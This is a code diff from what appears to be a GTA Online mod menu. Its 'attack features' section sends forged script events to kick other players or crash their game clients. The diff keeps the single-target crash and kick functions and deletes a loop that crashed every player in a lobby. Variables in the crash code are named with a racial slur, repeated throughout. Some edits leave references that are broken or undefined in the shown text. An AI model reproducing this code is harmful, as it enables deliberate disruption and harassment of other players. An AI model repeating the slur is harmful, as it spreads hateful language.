@@ -393,9 +393,9 @@ namespace big
 	/*ATTACK FEATURES*/
 	
 	
-	void features::kick()
+	void features::kick(int player)
 	{
-		unsigned int player = (1 << features::g_selected_player);
+		//unsigned int player = (1 << features::g_selected_player);
 		
 		uint64_t kick1[] = { -371781708, PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(features::g_selected_player), 0, 0 };
 		uint64_t kick2[] = { 1514515570, PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(features::g_selected_player), 0, 0 };
@@ -416,13 +416,13 @@ namespace big
 	}
 	void features::notification()
 	{
-		unsigned int player = (1 << features::g_selected_player);
+		//unsigned int player = (1 << features::g_selected_player);
 		uint64_t notification[] = { 802133775, PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(features::g_selected_player), 21000, 21000, 21000 };
-		g_pointers->m_TriggerScriptEvent(1, notification, 4, player);
+		//g_pointers->m_TriggerScriptEvent(1, notification, 4, player);
 	}
-	void features::crash()
+	void features::crash(int player)
 	{
-		unsigned int player = (1 << features::g_selected_player);
+		//unsigned int player = (1 << features::g_selected_player);
 		int nigger = rand() % -2147483647 + 2147483647;
 		uint64_t crash1[] = { -393294520, PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(features::g_selected_player), nigger, nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger };
 		uint64_t crash2[] = { -1386010354, PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(features::g_selected_player), nigger, nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger };
@@ -430,21 +430,7 @@ namespace big
 		uint64_t crash[] = { *crash1, *crash2, *crash3 };
 		g_pointers->m_TriggerScriptEvent(1, crash, 4, player);
 	}
-	void features::crashall()
-	{
-		for (int i = 0; i < 32; i++)
-		{
-			
 
-			unsigned int player = (1 << i);
-			int nigger = rand() % -2147483647 + 2147483647;
-			uint64_t crash1[] = { -393294520, PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(i), nigger, nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger };
-			uint64_t crash2[] = { -1386010354, PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(i), nigger, nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger };
-			uint64_t crash3[] = { 962740265, PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(i), nigger, nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger,nigger };
-			uint64_t crash[] = { *crash1, *crash2, *crash3 };
-			g_pointers->m_TriggerScriptEvent(1, crash, 4, player);
-		}
-	}
 
 	void features::run_tick()
 	{
